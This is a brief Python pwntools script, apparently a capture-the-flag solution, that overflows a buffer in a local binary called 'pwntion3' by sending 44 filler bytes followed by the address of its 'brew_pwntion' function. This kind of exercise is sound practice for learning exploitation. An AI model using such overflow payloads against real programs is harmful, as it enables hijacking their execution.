from pwn import *

e = ELF('./pwntion3')
p = process('./pwntion3')

pwn_addr = e.symbols['brew_pwntion']

payload = 'A'*44
payload += p32(pwn_addr)

print p.recvuntil('Student: ')
p.sendline(payload)
print p.recv()